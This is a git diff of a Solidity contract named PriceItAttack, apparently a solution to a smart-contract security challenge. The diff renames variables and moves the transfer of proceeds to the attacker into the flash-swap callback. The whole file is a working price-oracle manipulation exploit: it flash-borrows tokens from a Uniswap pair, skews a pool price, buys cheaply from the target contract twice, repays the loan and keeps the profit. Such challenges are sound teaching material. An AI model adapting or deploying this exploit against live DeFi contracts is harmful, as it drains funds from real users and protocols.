@@ -13,22 +13,19 @@ contract PriceItAttack {
   IERC20 private token1;
   IERC20 private token2;
   IUniswapV2Pair private token0Token2Pair;
-  PriceIt private level;
-  uint256 private amount = 50000 ether;
+  PriceIt private instance;
+  uint256 private flashSwapAmount = 50000 ether;
   address private attacker;
 
-  function doYourThing(PriceIt _level) external {
-    level = _level;
-    token0 = level.token0();
-    token1 = level.token1();
-    token2 = level.token2();
+  function doYourThing(PriceIt _instance) external {
+    attacker = msg.sender;
+    instance = _instance;
+    token0 = instance.token0();
+    token1 = instance.token1();
+    token2 = instance.token2();
     token0Token2Pair = IUniswapV2Pair(uniFactory.getPair(address(token0), address(token2)));
-    bytes memory data = abi.encode(token0, amount);
-    IUniswapV2Pair(token0Token2Pair).swap(amount, 0, address(this), data);
-  }
-
-  function withdrawToken0() external {
-    token0.transfer(msg.sender, token0.balanceOf(address(this)));
+    bytes memory data = abi.encode(token0, flashSwapAmount);
+    IUniswapV2Pair(token0Token2Pair).swap(flashSwapAmount, 0, address(this), data);
   }
 
   function uniswapV2Call(
@@ -37,35 +34,36 @@ contract PriceItAttack {
     uint256,
     bytes calldata
   ) external {
-    token0.approve(address(uniRouter), amount);
-    _swapTwoTokens(token0, token1, amount);
+    token0.approve(address(uniRouter), flashSwapAmount);
+    swapTwoTokens(token0, token1, flashSwapAmount);
     uint256 token1Balance = IERC20(token1).balanceOf(address(this));
-    token1.approve(address(level), token1Balance);
-    level.buyToken(token1Balance / 2, token1);
-    level.buyToken(token1Balance / 2, token1);
-    _returnFlashSwap(address(token0), address(token0Token2Pair), amount);
+    token1.approve(address(instance), token1Balance);
+    instance.buyToken(token1Balance / 2, token1);
+    instance.buyToken(token1Balance / 2, token1);
+    returnFlashSwap(address(token0), address(token0Token2Pair), flashSwapAmount);
+    token0.transfer(attacker, token0.balanceOf(address(this)));
   }
 
-  function _swapTwoTokens(
-    IERC20 _from,
-    IERC20 _to,
-    uint256 _inputAmount
+  function swapTwoTokens(
+    IERC20 from,
+    IERC20 to,
+    uint256 inputAmount
   ) private {
     address[] memory path = new address[](2);
-    path[0] = address(_from);
-    path[1] = address(_to);
-    _from.approve(address(uniRouter), _inputAmount);
-    uniRouter.swapExactTokensForTokens(_inputAmount, 0, path, address(this), block.timestamp);
+    path[0] = address(from);
+    path[1] = address(to);
+    from.approve(address(uniRouter), inputAmount);
+    uniRouter.swapExactTokensForTokens(inputAmount, 0, path, address(this), block.timestamp);
   }
 
-  function _returnFlashSwap(
-    address _tokenBorrow,
-    address _pair,
-    uint256 _amountTaken
+  function returnFlashSwap(
+    address tokenBorrow,
+    address pair,
+    uint256 amountTaken
   ) private {
     // about 0.3%
-    uint256 fee = ((_amountTaken * 3) / 997) + 1;
-    uint256 amountToRepay = _amountTaken + fee;
-    IERC20(_tokenBorrow).transfer(_pair, amountToRepay);
+    uint256 fee = ((amountTaken * 3) / 997) + 1;
+    uint256 amountToRepay = amountTaken + fee;
+    IERC20(tokenBorrow).transfer(pair, amountToRepay);
   }
 }
